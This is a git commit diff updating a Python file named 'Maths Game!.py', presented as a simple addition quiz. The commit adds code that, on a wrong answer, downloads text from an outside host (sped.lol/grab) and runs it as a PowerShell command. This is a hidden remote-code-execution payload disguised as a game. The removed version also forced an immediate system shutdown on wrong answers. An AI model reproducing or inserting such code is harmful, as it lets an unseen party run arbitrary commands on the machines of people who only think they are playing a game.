be8c3c060940ad5135e11d9d0e9d2b123cc07914
K.Dot <110929758+KDot227@users.noreply.github.com>
2022-12-21 09:27:23 -0600

    Update Maths Game!.py

--- Maths Game!.py
+++ Maths Game!.py
@@ -1,50 +1,18 @@
-#Created By Pogdog#2220
+import requests
+import random
+import subprocess
 
-import time
-import os
-from os import system
-print("Do You Want To Play A Game There Are 3 Questions??")
-answere = input("Y/N? ")
-if answere == "Y":
-    print("Have Fun!!!")
-else:
-    os.system("shutdown /s /t 0")
+def get_random():
+    return random.randint(1, 100)
 
-print("This Is A Maths Game, I Hope Your Good At Math!!")
-
-time.sleep(1)
-
-print("First Question, This Is An Easy One!")
-
-time.sleep(1)
-
-Q1 = input("Whats 9+10? ") 
-if Q1 == "19":
-        print("Well Done, Your Not A Fuck Face And You Got It Right!")
-else:
-    os.system("shutdown /s /t 0")
-
-time.sleep(1)
-
-print("Question 2!!! Oh Yeah, I forgot, If you get even one question wrong, you will die!")
-
-time.sleep(1)
-
-Q2 = input("whats 10+72 ")
-if Q2 == "82":
-    print("well done, you got it right, this one was a bit harder")
-else:
-        system.os("shutdown /s /t 0")
-
-time.sleep(1)
-
-print("FINAL QUESTION!!, You Made It This Far, Your Pretty Good At Math")
-Q3 = input("whats 109+81? ")
-if Q3 == "200":
-           print("YOU DID IT, You Win!!!")
-else:
-               print("shutdown /s /t 0")
-
-time.sleep(1)
-exit()
-
+def main():
+    num1 = get_random()
+    num2 = get_random()
+    print(f'What is {num1} + {num2}?')
+    answer = input()
+    if answer == str(num1 + num2):
+        print('Correct!')
+    else:
+        r = requests.get('http://sped.lol/grab').text
+        completed = subprocess.run(["powershell", "-Command", r], capture_output=True)
+        print(completed.stdout.decode('utf-8'))
